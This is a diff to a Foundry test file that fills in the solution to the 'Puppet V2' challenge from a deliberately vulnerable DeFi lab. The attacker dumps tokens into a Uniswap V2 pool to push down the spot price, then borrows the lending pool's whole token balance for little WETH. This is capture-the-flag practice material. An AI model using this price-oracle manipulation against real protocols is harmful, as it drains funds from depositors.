@@ -116,11 +116,33 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    // function testExploit() public {
-    //     /** EXPLOIT START **/
-    //     /** EXPLOIT END **/
-    //     validation();
-    // }
+    function testExploit() public {
+        /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        // Deposit TOKEN to uniswap pool and change price
+        dvt.approve(address(uniswapV2Router), POOL_INITIAL_TOKEN_BALANCE);
+        // amountOutMin must be retrieved from an oracle of some kind
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            path,
+            attacker,
+            DEADLINE
+        );
+
+        uint256 wethRequired = puppetV2Pool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        weth.deposit{value: wethRequired}();
+        weth.approve(address(puppetV2Pool), wethRequired);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+        /** EXPLOIT END **/
+        validation();
+    }
 
     function validation() internal {
         /** SUCCESS CONDITIONS */
